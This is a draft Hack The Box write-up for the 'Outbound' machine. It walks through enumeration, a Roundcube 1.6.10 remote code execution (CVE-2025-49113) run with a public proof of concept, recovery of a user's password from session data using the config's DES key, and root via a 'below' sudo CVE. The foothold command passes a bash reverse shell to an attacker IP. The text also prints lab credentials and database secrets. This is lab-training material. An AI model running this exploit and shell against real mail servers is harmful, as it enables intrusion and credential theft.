---
slug: /write-up/htb/easy/outbound
pagination_next: null
pagination_prev: null
draft: true
---

As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2

## Enumeration

Answers to pings:

```bash
└─$ ping 10.10.11.77                                                         
PING 10.10.11.77 (10.10.11.77) 56(84) bytes of data.
64 bytes from 10.10.11.77: icmp_seq=1 ttl=63 time=37.9 ms
64 bytes from 10.10.11.77: icmp_seq=2 ttl=63 time=38.6 ms
```

Initial nmap scan shows port 22 and 80 open:

```bash
└─$ nmap 10.10.11.77                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 00:30 CEST
Nmap scan report for outbound.htb (10.10.11.77)
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
```

curl -vv reveals the domain: 
```
Location: http://mail.outbound.htb/
```

Entering the website, we see `Roundcube webmail`, the credentials are provided at the begining. We got inside the webmail.

Interestingly, there's an import section which allows the user to upload a file. This if not done properly, might allow the attacker to submit something nasty. Looks good!

Also there's an option to import contacts. Looks promising as well.

## Foothold

From the UI, we can see it's Roundcube Webmail 1.6.10. Let's check for vulnerabilities and boom:

- https://fearsoff.org/research/roundcube
- https://www.offsec.com/blog/cve-2025-49113/

We can close the Github poc and we can make the server connect to our machine to get a reverse shell:

```bash
└─$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c '/bin/bash -i >& /dev/tcp/10.10.15.19/9001 0>&1'"
```

It was curious because the command needed `bash -c` to get executed successfully. Apparently the problem is with the redirections and so on. If the shell is not bash, it will not work. When passing `bash -c` we are forcing the shell to execute the command as bash.

Now we are in, and we land in the web folder of the server. We can try to extract the user flag, but the user does not have privileges.

Now we need to do Lateral movement to get a user with higher permissions.

## Lateral movement

Looking at the configuration files for Roundcube, there's a user/password for MySQL:

```
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

Also something interesting came up, let's keep it just in case

```
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

The session data is stored in base64 in the databaase. Once decoded, it reveals the password encrypted with the `des_key`. With a small python script, we can decrypt it and get the password for another user `jacob`:

jacob:595mO8DmwGeD

Now, we can access this emails. There's an email specifying the credentials to login into the machine under jacob's user and retrieve the user flag.

ssh jacob@mail.outbound.htb

with password `gY4Wr3a1evp4`

Now we need to escalate privileges to retrieve root flag.

## Escalating privileges

The welcome message shows it's ubuntu 24.

First checking what can do with sudo:

```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Apparently the user can run the below command as root without providing any password

And there's a CVE for below:

https://dollarboysushil.com/posts/CVE-2025-27591-Privilege-Escalation-in-below/

Following the process described there, below can be used to escalate privileges and retrieve the root flag.